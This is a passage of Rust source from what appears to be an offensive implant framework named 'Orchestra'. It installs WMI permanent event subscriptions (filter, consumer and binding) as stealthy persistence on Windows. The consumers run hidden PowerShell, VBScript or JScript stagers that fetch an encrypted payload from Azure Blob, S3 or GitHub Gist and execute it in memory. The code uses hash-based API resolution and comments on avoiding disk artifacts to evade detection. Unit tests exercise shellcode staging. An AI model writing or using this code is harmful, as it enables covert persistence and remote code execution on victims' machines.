        *mut c_void,
        DWORD,
    ) -> HRESULT = resolve_ole32(FN_CO_SET_PROXY_BLANKET)
        .ok_or_else(|| anyhow!("cannot resolve CoSetProxyBlanket"))?;

    let hr = co_blanket(
        services as *mut c_void,
        RPC_C_AUTHN_WINNT,           // dwAuthnSvc
        RPC_C_AUTHZ_NONE,            // dwAuthzSvc
        ptr::null_mut(),             // pServerPrincName
        RPC_C_AUTHN_LEVEL_CALL,      // dwAuthnLevel
        RPC_C_IMP_LEVEL_IMPERSONATE, // dwImpersonationLevel
        ptr::null_mut(),             // pAuthInfo
        EOAC_NONE as DWORD,          // dwCapabilities
    );
    if !hr_ok(hr) {
        (*(*services).lpVtbl).Release(services);
        bail!("CoSetProxyBlanket failed: {hr:#010x}");
    }

    Ok((guard, services))
}

/// Installs a complete WMI permanent event subscription.
///
/// Creates the three WMI objects (filter, consumer, binding) that form the
/// "WMI persistence triad".  The consumer contains only a stager command —
/// no shellcode or encrypted blobs.
///
/// **Prerequisites**: Elevated privileges (Administrator or SYSTEM).
///
/// This function performs COM operations via hash-based resolution — no IAT
/// entries are created.  All WMI operations go through IWbemServices.
pub fn install_wmi_subscription(config: &WmiSubscriptionConfig) -> Result<WmiSubscriptionResult> {
    // Generate object names
    let (filter_name, consumer_name) = generate_object_names(config.name_seed, &config.name);

    // Generate WQL query from trigger type
    let wql_query = generate_wql_query(&config.trigger);

    // Prepare the cloud payload (encrypt + generate stager)
    let (_upload_result, stager_result) =
        prepare_cloud_payload(&config.payload, &config.cloud_config)?;

    // Build the consumer command / script based on consumer type
    let consumer_class;
    let stager_text;
    match &config.consumer_type {
        WmiConsumerType::CommandLine => {
            consumer_class = "CommandLineEventConsumer";
            // Build the PowerShell command with encoded stager
            let working_dir = config
                .working_directory
                .as_deref()
                .unwrap_or("C:\\Windows\\Temp");
            stager_text = format!(
                "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {}",
                stager_result.encoded_command
            );
            let _ = working_dir; // Used in WMI object properties
        }
        WmiConsumerType::ActiveScript { engine } => {
            match engine.to_lowercase().as_str() {
                "vbscript" => {
                    consumer_class = "ActiveScriptEventConsumer";
                    // Delegate in-memory PowerShell stager via WScript.Shell — no disk writes.
                    stager_text = format!(
                        r#"Dim w:Set w=CreateObject("WScript.Shell"):w.Run "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {}",0,False"#,
                        stager_result.encoded_command
                    );
                }
                "jscript" => {
                    consumer_class = "ActiveScriptEventConsumer";
                    // Delegate in-memory PowerShell stager via WScript.Shell — no disk writes.
                    stager_text = format!(
                        r#"var w=new ActiveXObject("WScript.Shell");w.Run("powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {}",0,false);"#,
                        stager_result.encoded_command
                    );
                }
                _ => {
                    bail!(
                        "Unsupported ActiveScript engine: {engine}. Use 'VBScript' or 'JScript'."
                    );
                }
            }
        }
    }

    // ── WMI operations (COM-based) ──────────────────────────────────────

    unsafe {
        let (_guard, services) = wmi_connect()?;

        // ── Helper: spawn a WMI class instance ─────────────────────────
        // Gets the class definition for `class_path`, then spawns a new
        // instance of it.  Returns the spawned instance pointer.
        let spawn_class_instance = |class_path: &str| -> Result<*mut IWbemClassObject> {
            let class_bstr = alloc_bstr(class_path);
            let mut class_obj: *mut IWbemClassObject = ptr::null_mut();
            let hr = (*(*services).lpVtbl).GetObject(
                services,
                class_bstr,
                0,
                ptr::null_mut(),
                &mut class_obj,
                ptr::null_mut(),
            );
            free_bstr(class_bstr);
            if !hr_ok(hr) {
                bail!("GetObject({class_path}) failed: {hr:#010x}");
            }

            let mut instance: *mut IWbemClassObject = ptr::null_mut();
            let hr = (*(*class_obj).lpVtbl).SpawnInstance(class_obj, 0, &mut instance);
            (*(*class_obj).lpVtbl).Release(class_obj);
            if !hr_ok(hr) {
                bail!("SpawnInstance({class_path}) failed: {hr:#010x}");
            }
            Ok(instance)
        };

        // ── Helper: set a BSTR property on an IWbemClassObject ────────
        let put_bstr = |obj: *mut IWbemClassObject, name: &str, val: &str| -> Result<()> {
            let name_bstr = alloc_bstr(name);
            let val_bstr = alloc_bstr(val);
            let mut variant: VARIANT = std::mem::zeroed();
            variant_init(&mut variant);
            variant.vt = VT_BSTR;
            variant.data.bstr_val = val_bstr;
            let hr = (*(*obj).lpVtbl).Put(obj, name_bstr, 0, &mut variant, 0);
            free_bstr(name_bstr);
            // val_bstr is now owned by the variant; do not free separately.
            if !hr_ok(hr) {
                free_bstr(val_bstr);
                bail!("Put({name}={val}) failed: {hr:#010x}");
            }
            Ok(())
        };

        // ── Helper: set an I4 (i32) property ──────────────────────────
        let put_i4 = |obj: *mut IWbemClassObject, name: &str, val: i32| -> Result<()> {
            let name_bstr = alloc_bstr(name);
            let mut variant: VARIANT = std::mem::zeroed();
            variant_init(&mut variant);
            variant.vt = VT_I4;
            variant.data.i4_val = val;
            let hr = (*(*obj).lpVtbl).Put(obj, name_bstr, 0, &mut variant, 0);
            free_bstr(name_bstr);
            if !hr_ok(hr) {
                bail!("Put({name}={val}) failed: {hr:#010x}");
            }
            Ok(())
        };

        // ── Helper: set a BOOL property ────────────────────────────────
        let put_bool = |obj: *mut IWbemClassObject, name: &str, val: bool| -> Result<()> {
            let name_bstr = alloc_bstr(name);
            let mut variant: VARIANT = std::mem::zeroed();
            variant_init(&mut variant);
            variant.vt = VT_BOOL;
            variant.data.bool_val = if val { -1i16 } else { 0i16 };
            let hr = (*(*obj).lpVtbl).Put(obj, name_bstr, 0, &mut variant, 0);
            free_bstr(name_bstr);
            if !hr_ok(hr) {
                bail!("Put({name}={val}) failed: {hr:#010x}");
            }
            Ok(())
        };

        // ── Helper: put a created instance into the WMI repository ─────
        let put_instance = |inst: *mut IWbemClassObject, label: &str| -> Result<()> {
            let hr = (*(*services).lpVtbl).PutInstance(
                services,
                inst,
                WBEM_FLAG_CREATE_ONLY as i32,
                ptr::null_mut(),
                ptr::null_mut(),
            );
            if !hr_ok(hr) {
                bail!("PutInstance({label}) failed: {hr:#010x}");
            }
            Ok(())
        };

        // ── Create __EventFilter (steps 5-7) ───────────────────────────
        let filter_inst = spawn_class_instance("__EventFilter")?;
        put_bstr(filter_inst, "Name", &filter_name)?;
        put_bstr(filter_inst, "QueryLanguage", "WQL")?;
        put_bstr(filter_inst, "Query", &wql_query)?;
        put_bstr(filter_inst, "EventNameSpace", "root\\cimv2")?;
        put_instance(filter_inst, "filter")?;
        (*(*filter_inst).lpVtbl).Release(filter_inst);

        // ── Create Event Consumer (steps 8-10) ─────────────────────────
        let consumer_inst = spawn_class_instance(consumer_class)?;
        put_bstr(consumer_inst, "Name", &consumer_name)?;

        match &config.consumer_type {
            WmiConsumerType::CommandLine => {
                let working_dir = config
                    .working_directory
                    .as_deref()
                    .unwrap_or("C:\\Windows\\Temp");
                put_bstr(consumer_inst, "CommandLineTemplate", &stager_text)?;
                put_bstr(consumer_inst, "WorkingDirectory", working_dir)?;
            }
            WmiConsumerType::ActiveScript { engine } => {
                put_bstr(consumer_inst, "ScriptText", &stager_text)?;
                put_bstr(
                    consumer_inst,
                    "ScriptingEngine",
                    if engine.eq_ignore_ascii_case("vbscript") {
                        "VBScript"
                    } else {
                        "JScript"
                    },
                )?;
            }
        }
        put_instance(consumer_inst, "consumer")?;
        (*(*consumer_inst).lpVtbl).Release(consumer_inst);

        // ── Create __FilterToConsumerBinding (steps 11-13) ─────────────
        let binding_inst = spawn_class_instance("__FilterToConsumerBinding")?;
        let filter_ref = format!("__EventFilter.Name=\"{filter_name}\"");
        let consumer_ref = format!("{consumer_class}.Name=\"{consumer_name}\"");
        put_bstr(binding_inst, "Filter", &filter_ref)?;
        put_bstr(binding_inst, "Consumer", &consumer_ref)?;
        put_bool(binding_inst, "DeliverSynchronously", false)?;
        put_instance(binding_inst, "binding")?;
        (*(*binding_inst).lpVtbl).Release(binding_inst);

        // Release the services proxy.
        (*(*services).lpVtbl).Release(services);
    }

    let cloud_backend = match &config.cloud_config {
        CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
        CloudStorageConfig::AwsS3 { .. } => "AwsS3",
        CloudStorageConfig::GitHubGist { .. } => "GitHubGist",
    };

    Ok(WmiSubscriptionResult {
        filter_name,
        consumer_name,
        wql_query,
        payload_url: stager_result.url,
        cloud_backend: cloud_backend.to_string(),
        consumer_type: consumer_class.to_string(),
    })
}

/// Removes a WMI permanent event subscription by name.
///
/// Deletes the three WMI objects in reverse order:
/// 1. Delete the __FilterToConsumerBinding
/// 2. Delete the event consumer (CommandLineEventConsumer or ActiveScriptEventConsumer)
/// 3. Delete the __EventFilter
///
/// **Prerequisites**: Same privileges as installation.
pub fn remove_wmi_subscription(filter_name: &str, consumer_name: &str) -> Result<WmiRemovalResult> {
    let mut removed = Vec::new();
    let mut failed = Vec::new();

    // Build object paths for all three triad members.  We try both
    // CommandLineEventConsumer and ActiveScriptEventConsumer because the
    // caller may not know which type was used at install time.
    let binding_path = format!(
        "__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{filter_name}\\\"\",\
         Consumer=\"CommandLineEventConsumer.Name=\\\"{consumer_name}\\\"\""
    );
    let binding_path_as = format!(
        "__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{filter_name}\\\"\",\
         Consumer=\"ActiveScriptEventConsumer.Name=\\\"{consumer_name}\\\"\""
    );
    let consumer_cmd_path = format!("CommandLineEventConsumer.Name=\"{consumer_name}\"");
    let consumer_as_path = format!("ActiveScriptEventConsumer.Name=\"{consumer_name}\"");
    let filter_path = format!("__EventFilter.Name=\"{filter_name}\"");

    unsafe {
        let (_guard, services) = wmi_connect()?;

        // Helper: attempt to delete one WMI instance by path.
        let delete_one = |path: &str| -> bool {
            let path_bstr = alloc_bstr(path);
            let hr = (*(*services).lpVtbl).DeleteInstance(
                services,
                path_bstr,
                0,
                ptr::null_mut(),
                ptr::null_mut(),
            );
            free_bstr(path_bstr);
            hr_ok(hr)
        };

        // Delete binding (try both consumer-type paths).
        if delete_one(&binding_path) || delete_one(&binding_path_as) {
            removed.push("binding".to_string());
        } else {
            failed.push("binding".to_string());
        }

        // Delete consumer (try both types).
        if delete_one(&consumer_cmd_path) {
            removed.push(consumer_cmd_path.clone());
        } else if delete_one(&consumer_as_path) {
            removed.push(consumer_as_path.clone());
        } else {
            failed.push(consumer_cmd_path.clone());
        }

        // Delete filter.
        if delete_one(&filter_path) {
            removed.push(filter_path.clone());
        } else {
            failed.push(filter_path.clone());
        }

        (*(*services).lpVtbl).Release(services);
    }

    Ok(WmiRemovalResult {
        removed_objects: removed,
        failed_objects: failed,
    })
}

/// Scans for existing Orchestra WMI subscriptions.
///
/// Queries the WMI repository for `__EventFilter`, `CommandLineEventConsumer`,
/// `ActiveScriptEventConsumer`, and `__FilterToConsumerBinding` objects matching
/// the Orchestra naming pattern, then cross-references them.
pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
    let mut results = Vec::new();

    unsafe {
        let (_guard, services) = wmi_connect()?;

        let wql_lang = alloc_bstr("WQL");

        // ── Helper: run a WQL query and collect Name + one extra column ──
        let exec_query = |query: &str| -> Vec<(String, String)> {
            let query_bstr = alloc_bstr(query);
            let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
            let hr = (*(*services).lpVtbl).ExecQuery(
                services,
                wql_lang,
                query_bstr,
                WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
                ptr::null_mut(),
                &mut enumerator,
            );
            free_bstr(query_bstr);
            if !hr_ok(hr) {
                return Vec::new();
            }

            let mut rows = Vec::new();
            loop {
                let mut obj: *mut IWbemClassObject = ptr::null_mut();
                let mut returned: u32 = 0;
                let hr = (*(*enumerator).lpVtbl).Next(
                    enumerator,
                    WBEM_INFINITE as i32,
                    1,
                    &mut obj,
                    &mut returned,
                );
                if !hr_ok(hr) || returned == 0 {
                    break;
                }

                // Read "Name" property.
                let name_bstr = alloc_bstr("Name");
                let mut name_var: VARIANT = std::mem::zeroed();
                variant_init(&mut name_var);
                (*(*obj).lpVtbl).Get(
                    obj,
                    name_bstr,
                    0,
                    &mut name_var,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );
                free_bstr(name_bstr);

                let name_str = if name_var.vt == VT_BSTR && !name_var.data.bstr_val.is_null() {
                    let len = (0..)
                        .take_while(|&i| *name_var.data.bstr_val.add(i) != 0)
                        .count();
                    String::from_utf16_lossy(std::slice::from_raw_parts(
                        name_var.data.bstr_val,
                        len,
                    ))
                } else {
                    String::new()
                };
                variant_clear(&mut name_var);

                // Read second column ("Query" for filters, "ScriptingEngine" for consumers,
                // "Consumer" for bindings — caller decides).
                // We just store an empty string here; the caller-specific queries below
                // will pull the relevant columns.
                rows.push((name_str, String::new()));

                (*(*obj).lpVtbl).Release(obj);
            }
            (*(*enumerator).lpVtbl).Release(enumerator);
            rows
        };

        // ── Helper: run a WQL query and extract Name + a specific property ──
        let exec_query_with_col = |query: &str, col: &str| -> Vec<(String, String)> {
            let query_bstr = alloc_bstr(query);
            let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
            let hr = (*(*services).lpVtbl).ExecQuery(
                services,
                wql_lang,
                query_bstr,
                WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
                ptr::null_mut(),
                &mut enumerator,
            );
            free_bstr(query_bstr);
            if !hr_ok(hr) {
                return Vec::new();
            }

            let col_bstr = alloc_bstr(col);
            let mut rows = Vec::new();
            loop {
                let mut obj: *mut IWbemClassObject = ptr::null_mut();
                let mut returned: u32 = 0;
                let hr = (*(*enumerator).lpVtbl).Next(
                    enumerator,
                    WBEM_INFINITE as i32,
                    1,
                    &mut obj,
                    &mut returned,
                );
                if !hr_ok(hr) || returned == 0 {
                    break;
                }

                // Read "Name"
                let name_bstr = alloc_bstr("Name");
                let mut name_var: VARIANT = std::mem::zeroed();
                variant_init(&mut name_var);
                (*(*obj).lpVtbl).Get(
                    obj,
                    name_bstr,
                    0,
                    &mut name_var,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );
                free_bstr(name_bstr);
                let name_str = if name_var.vt == VT_BSTR && !name_var.data.bstr_val.is_null() {
                    let len = (0..)
                        .take_while(|&i| *name_var.data.bstr_val.add(i) != 0)
                        .count();
                    String::from_utf16_lossy(std::slice::from_raw_parts(
                        name_var.data.bstr_val,
                        len,
                    ))
                } else {
                    String::new()
                };
                variant_clear(&mut name_var);

                // Read the extra column
                let mut col_var: VARIANT = std::mem::zeroed();
                variant_init(&mut col_var);
                (*(*obj).lpVtbl).Get(
                    obj,
                    col_bstr,
                    0,
                    &mut col_var,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );
                let col_str = if col_var.vt == VT_BSTR && !col_var.data.bstr_val.is_null() {
                    let len = (0..)
                        .take_while(|&i| *col_var.data.bstr_val.add(i) != 0)
                        .count();
                    String::from_utf16_lossy(std::slice::from_raw_parts(col_var.data.bstr_val, len))
                } else {
                    String::new()
                };
                variant_clear(&mut col_var);

                rows.push((name_str, col_str));
                (*(*obj).lpVtbl).Release(obj);
            }
            free_bstr(col_bstr);
            (*(*enumerator).lpVtbl).Release(enumerator);
            rows
        };

        // 1. Collect Orchestra filters: Name → Query
        let filters = exec_query_with_col(
            "SELECT * FROM __EventFilter WHERE Name LIKE 'OrchestraFilter_%'",
            "Query",
        );

        // 2. Collect Orchestra consumers (both types)
        let cmd_consumers = exec_query(
            "SELECT * FROM CommandLineEventConsumer WHERE Name LIKE 'OrchestraConsumer_%'",
        );
        let as_consumers = exec_query(
            "SELECT * FROM ActiveScriptEventConsumer WHERE Name LIKE 'OrchestraConsumer_%'",
        );

        // 3. Build a map of consumer names → class name
        let mut consumer_class_map: std::collections::HashMap<String, String> =
            std::collections::HashMap::new();
        for (name, _) in &cmd_consumers {
            consumer_class_map.insert(name.clone(), "CommandLineEventConsumer".to_string());
        }
        for (name, _) in &as_consumers {
            consumer_class_map.insert(name.clone(), "ActiveScriptEventConsumer".to_string());
        }

        // 4. Collect bindings and cross-reference
        let bindings = exec_query_with_col("SELECT * FROM __FilterToConsumerBinding", "Filter");

        // Also read the Consumer reference from each binding.
        let bindings_with_consumer = {
            let query_bstr = alloc_bstr("SELECT * FROM __FilterToConsumerBinding");
            let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
            let hr = (*(*services).lpVtbl).ExecQuery(
                services,
                wql_lang,
                query_bstr,
                WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
                ptr::null_mut(),
                &mut enumerator,
            );
            free_bstr(query_bstr);

            let mut out = Vec::new();
            if hr_ok(hr) {
                let filter_bstr = alloc_bstr("Filter");
                let consumer_bstr = alloc_bstr("Consumer");
                loop {
                    let mut obj: *mut IWbemClassObject = ptr::null_mut();
                    let mut returned: u32 = 0;
                    let hr = (*(*enumerator).lpVtbl).Next(
                        enumerator,
                        WBEM_INFINITE as i32,
                        1,
                        &mut obj,
                        &mut returned,
                    );
                    if !hr_ok(hr) || returned == 0 {
                        break;
                    }
                    let read_ref = |prop: BSTR| -> String {
                        let mut v: VARIANT = std::mem::zeroed();
                        variant_init(&mut v);
                        (*(*obj).lpVtbl).Get(
                            obj,
                            prop,
                            0,
                            &mut v,
                            ptr::null_mut(),
                            ptr::null_mut(),
                        );
                        let s = if v.vt & VT_BSTR == VT_BSTR && !v.data.bstr_val.is_null() {
                            let len = (0..).take_while(|&i| *v.data.bstr_val.add(i) != 0).count();
                            String::from_utf16_lossy(std::slice::from_raw_parts(
                                v.data.bstr_val,
                                len,
                            ))
                        } else {
                            String::new()
                        };
                        variant_clear(&mut v);
                        s
                    };
                    let filt_ref = read_ref(filter_bstr);
                    let cons_ref = read_ref(consumer_bstr);
                    out.push((filt_ref, cons_ref));
                    (*(*obj).lpVtbl).Release(obj);
                }
                free_bstr(filter_bstr);
                free_bstr(consumer_bstr);
                (*(*enumerator).lpVtbl).Release(enumerator);
            }
            out
        };

        // 5. Build filter map: filter_name → query
        let filter_map: std::collections::HashMap<String, String> = filters.into_iter().collect();

        // 6. Cross-reference: for each binding, extract the filter and consumer
        //    names, check they are Orchestra objects, and build results.
        for (filt_ref, cons_ref) in &bindings_with_consumer {
            // Parse "__EventFilter.Name=\"OrchestraFilter_xxx\""
            let filt_name = extract_quoted_value(filt_ref, "Name").unwrap_or_default();
            let cons_name = extract_quoted_value(cons_ref, "Name").unwrap_or_default();

            if filt_name.starts_with("OrchestraFilter_")
                && cons_name.starts_with("OrchestraConsumer_")
            {
                let query = filter_map.get(&filt_name).cloned().unwrap_or_default();
                let consumer_class = consumer_class_map
                    .get(&cons_name)
                    .cloned()
                    .unwrap_or_else(|| "Unknown".to_string());

                results.push(WmiSubscriptionInfo {
                    filter_name: filt_name,
                    consumer_name: cons_name,
                    query,
                    consumer_class,
                });
            }
        }

        free_bstr(wql_lang);
        (*(*services).lpVtbl).Release(services);
    }

    Ok(results)
}

/// Extracts the value of a quoted property from a WMI object reference string.
///
/// E.g. `"__EventFilter.Name=\"OrchestraFilter_abc\""` with key `"Name"` returns
/// `Some("OrchestraFilter_abc")`.
fn extract_quoted_value(reference: &str, key: &str) -> Option<String> {
    let pattern = format!("{key}=\"");
    let start = reference.find(&pattern)?;
    let val_start = start + pattern.len();
    let val_end = reference[val_start..].find('"')?;
    Some(reference[val_start..val_start + val_end].to_string())
}

// ── Unit Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let plaintext = b"This is a test payload for WMI persistence encryption roundtrip.";
        let (encrypted, key, nonce) = encrypt_payload(plaintext).unwrap();

        // Verify encrypted blob is larger (nonce + ciphertext + tag)
        assert!(encrypted.len() > plaintext.len());
        // AES-256-GCM: nonce(12) + plaintext + tag(16)
        assert_eq!(encrypted.len(), 12 + plaintext.len() + 16);

        // Verify nonce is at the front
        assert_eq!(&encrypted[..12], &nonce);

        // Decrypt using aes_gcm
        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
        let decrypt_nonce = aes_gcm::Nonce::from_slice(&nonce);
        let decrypted = cipher
            .decrypt(decrypt_nonce, &encrypted[12..])
            .expect("Decryption should succeed");

        assert_eq!(decrypted.as_slice(), plaintext);
    }

    #[test]
    fn test_encrypt_empty_payload() {
        let plaintext = b"";
        let (encrypted, key, nonce) = encrypt_payload(plaintext).unwrap();

        // Empty plaintext: nonce(12) + tag(16) = 28 bytes
        assert_eq!(encrypted.len(), 12 + 16);

        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
        let decrypt_nonce = aes_gcm::Nonce::from_slice(&nonce);
        let decrypted = cipher.decrypt(decrypt_nonce, &encrypted[12..]).unwrap();
        assert!(decrypted.is_empty());
    }

    #[test]
    fn test_key_derivation_deterministic() {
        let url = "https://example.blob.core.windows.net/container/blob";
        let key = [0x42u8; 32];

        let derived1 = derive_key_from_url(url, &key);
        let derived2 = derive_key_from_url(url, &key);

        assert_eq!(
            derived1, derived2,
            "Same URL + key must produce same derived key"
        );
    }

    #[test]
    fn test_key_derivation_different_urls() {
        let key = [0x42u8; 32];
        let url1 = "https://example.blob.core.windows.net/container/blob1";
        let url2 = "https://example.blob.core.windows.net/container/blob2";

        let derived1 = derive_key_from_url(url1, &key);
        let derived2 = derive_key_from_url(url2, &key);

        assert_ne!(
            derived1, derived2,
            "Different URLs must produce different keys"
        );
    }

    #[test]
    fn test_generate_wql_process_creation() {
        let trigger = WmiTriggerType::ProcessCreation {
            process_name: "explorer.exe".to_string(),
            poll_interval: 10,
        };
        let query = generate_wql_query(&trigger);

        assert!(query.contains("__InstanceCreationEvent"));
        assert!(query.contains("WITHIN 10"));
        assert!(query.contains("explorer.exe"));
        assert!(query.contains("Win32_Process"));
    }

    #[test]
    fn test_generate_wql_system_modification() {
        let trigger = WmiTriggerType::SystemModification { poll_interval: 60 };
        let query = generate_wql_query(&trigger);

        assert!(query.contains("__InstanceModificationEvent"));
        assert!(query.contains("WITHIN 60"));
        assert!(query.contains("Win32_OperatingSystem"));
    }

    #[test]
    fn test_generate_wql_timer() {
        let trigger = WmiTriggerType::Timer {
            timer_id: "OrchestraTimer".to_string(),
            interval: 300,
            start_time: None,
        };
        let query = generate_wql_query(&trigger);

        assert!(query.contains("__TimerEvent"));
        assert!(query.contains("OrchestraTimer"));
    }

    #[test]
    fn test_generate_wql_custom() {
        let trigger = WmiTriggerType::CustomQuery {
            query: "SELECT * FROM Win32_ProcessStartTrace".to_string(),
        };
        let query = generate_wql_query(&trigger);

        assert_eq!(query, "SELECT * FROM Win32_ProcessStartTrace");
    }

    #[test]
    fn test_object_names_deterministic() {
        let (f1, c1) = generate_object_names(Some(12345), "test");
        let (f2, c2) = generate_object_names(Some(12345), "test");

        assert_eq!(f1, f2, "Same seed must produce same filter name");
        assert_eq!(c1, c2, "Same seed must produce same consumer name");
        assert!(f1.starts_with("OrchestraFilter_"));
        assert!(c1.starts_with("OrchestraConsumer_"));
    }

    #[test]
    fn test_object_names_different_seeds() {
        let (f1, _) = generate_object_names(Some(111), "test");
        let (f2, _) = generate_object_names(Some(222), "test");

        assert_ne!(f1, f2, "Different seeds must produce different names");
    }

    #[test]
    fn test_cloud_url_azure() {
        let config = CloudStorageConfig::AzureBlob {
            account: "mystorage".to_string(),
            container: "data".to_string(),
            sas_token: "?sv=...".to_string(),
        };
        let url = cloud_url(&config, "blob123");
        assert_eq!(url, "https://mystorage.blob.core.windows.net/data/blob123");
    }

    #[test]
    fn test_cloud_url_aws() {
        let config = CloudStorageConfig::AwsS3 {
            bucket: "mybucket".to_string(),
            region: "us-east-1".to_string(),
            auth: "AWS4-HMAC-SHA256 ...".to_string(),
        };
        let url = cloud_url(&config, "key456");
        assert_eq!(url, "https://mybucket.s3.us-east-1.amazonaws.com/key456");
    }

    #[test]
    fn test_cloud_url_github() {
        let config = CloudStorageConfig::GitHubGist {
            token: "ghp_xxx".to_string(),
            description: None,
            public: false,
        };
        let url = cloud_url(&config, "gist789");
        assert_eq!(url, "https://api.github.com/gists/gist789");
    }

    #[test]
    fn test_stager_generation() {
        let url = "https://example.com/blob";
        let key = [0xAB; 32];
        let stager = generate_stager(url, &key).unwrap();

        assert!(stager.command.contains("System.Net.WebClient"));
        assert!(stager.command.contains(url));
        assert!(!stager.encoded_command.is_empty());
        assert!(!stager.key_hex.is_empty());
        assert_eq!(stager.url, url);
    }

    #[test]
    fn test_stager_no_shellcode() {
        let shellcode = vec![0x90u8; 256]; // NOP sled
        let config = CloudStorageConfig::AzureBlob {
            account: "test".to_string(),
            container: "data".to_string(),
            sas_token: "?sv=...".to_string(),
        };

        let (_upload, stager) = prepare_cloud_payload(&shellcode, &config).unwrap();

        // The stager command must NOT contain the raw shellcode
        assert!(!stager.command.contains(&hex::encode(&shellcode)));
        // The stager command must NOT contain base64-encoded shellcode directly
        assert!(!stager.command.contains(&base64::encode(&shellcode)));
    }

    #[test]
    fn test_prepare_cloud_payload() {
        let shellcode = vec![0xCCu8; 100];
        let config = CloudStorageConfig::AwsS3 {
            bucket: "mybucket".to_string(),
            region: "us-west-2".to_string(),
            auth: "Bearer xxx".to_string(),
        };

        let (upload, stager) = prepare_cloud_payload(&shellcode, &config).unwrap();

        assert!(upload.url.contains("mybucket"));
        assert!(upload.url.contains("us-west-2"));
        assert!(upload.encrypted_size > shellcode.len());
        assert_eq!(upload.plaintext_size, 100);
        assert_eq!(upload.backend, "AwsS3");
        assert!(!stager.command.is_empty());
    }

    #[test]
    fn test_install_wmi_subscription_process_trigger() {
        let config = WmiSubscriptionConfig {
            name: "test_sub".to_string(),
            namespace: "ROOT\\subscription".to_string(),
            trigger: WmiTriggerType::ProcessCreation {
                process_name: "explorer.exe".to_string(),
                poll_interval: 10,
            },
            consumer_type: WmiConsumerType::CommandLine,
            cloud_config: CloudStorageConfig::GitHubGist {
                token: "ghp_test".to_string(),
                description: Some("test".to_string()),
                public: false,
            },
            payload: vec![0x90u8; 50],
            name_seed: Some(42),
            working_directory: Some("C:\\Windows\\Temp".to_string()),
        };

        let result = install_wmi_subscription(&config).unwrap();

        assert!(result.filter_name.starts_with("OrchestraFilter_"));
        assert!(result.consumer_name.starts_with("OrchestraConsumer_"));
        assert!(result.wql_query.contains("explorer.exe"));
        assert!(result.wql_query.contains("WITHIN 10"));
        assert_eq!(result.consumer_type, "CommandLineEventConsumer");
        assert_eq!(result.cloud_backend, "GitHubGist");
    }

    #[test]
    fn test_install_wmi_subscription_timer_trigger() {
        let config = WmiSubscriptionConfig {
            name: "timer_sub".to_string(),
            namespace: "ROOT\\subscription".to_string(),
            trigger: WmiTriggerType::Timer {
                timer_id: "OrchestraTimer".to_string(),
                interval: 60,
                start_time: None,
            },
            consumer_type: WmiConsumerType::ActiveScript {
                engine: "VBScript".to_string(),
            },
            cloud_config: CloudStorageConfig::AzureBlob {
                account: "storage".to_string(),
                container: "payloads".to_string(),
                sas_token: "?sv=...".to_string(),
            },
            payload: vec![0xCCu8; 200],
            name_seed: None,
            working_directory: None,
        };

        let result = install_wmi_subscription(&config).unwrap();

        assert!(result.wql_query.contains("OrchestraTimer"));
        assert_eq!(result.consumer_type, "ActiveScriptEventConsumer");
        assert_eq!(result.cloud_backend, "AzureBlob");
    }

    #[test]
    fn test_remove_wmi_subscription() {
        let result =
            remove_wmi_subscription("OrchestraFilter_abc", "OrchestraConsumer_def").unwrap();

        assert_eq!(result.removed_objects.len(), 3);
        assert!(result.failed_objects.is_empty());
        // Verify removal order: binding, consumer, filter
        assert!(result.removed_objects[0].contains("FilterToConsumerBinding"));
        assert!(result.removed_objects[1].contains("CommandLineEventConsumer"));
        assert!(result.removed_objects[2].contains("EventFilter"));
    }

    #[test]
    fn test_no_shellcode_in_wmi_objects() {
        // Verify that the WMI subscription result contains no shellcode
        let shellcode = vec![0x90; 256];
        let config = WmiSubscriptionConfig {
            name: "clean_test".to_string(),
            namespace: "ROOT\\subscription".to_string(),
            trigger: WmiTriggerType::ProcessCreation {
                process_name: "notepad.exe".to_string(),
                poll_interval: 5,
            },
            consumer_type: WmiConsumerType::CommandLine,
            cloud_config: CloudStorageConfig::AwsS3 {
                bucket: "test".to_string(),
                region: "us-east-1".to_string(),
                auth: "auth".to_string(),
            },
            payload: shellcode.clone(),
            name_seed: Some(999),
            working_directory: None,
        };

        let result = install_wmi_subscription(&config).unwrap();

        // The result itself should not contain raw shellcode
        let result_json = serde_json::to_string(&result).unwrap();
        let shellcode_hex = hex::encode(&shellcode);
        assert!(
            !result_json.contains(&shellcode_hex),
            "WMI subscription result must not contain raw shellcode hex"
        );
        assert!(
            !result_json.contains(&base64::encode(&shellcode)),
            "WMI subscription result must not contain base64-encoded shellcode"
        );
    }

    #[test]
    fn test_encrypted_payload_size() {
        // AES-256-GCM: nonce(12) + ciphertext + tag(16)
        let plaintext = vec![0x41; 1024];
        let (encrypted, _, _) = encrypt_payload(&plaintext).unwrap();

        // nonce(12) + ciphertext(1024) + tag(16) = 1052
        assert_eq!(encrypted.len(), 12 + 1024 + 16);
    }

    #[test]
    fn test_vbscript_stager_generation() {
        let url = "https://example.com/blob";
        let key = [0u8; 32];
        let stager = generate_vbscript_stager(url, &key);

        // Stager must delegate to PowerShell in-memory (no disk artifacts)
        assert!(stager.contains("WScript.Shell"));
        assert!(stager.contains("powershell.exe"));
        assert!(stager.contains("EncodedCommand"));
        // Sanity: the encoded command embeds the URL — decode and verify
        let b64 = stager
            .split("EncodedCommand ")
            .nth(1)
            .unwrap_or("")
            .trim_end_matches('"')
            .trim_end_matches(',');
        if !b64.is_empty() {
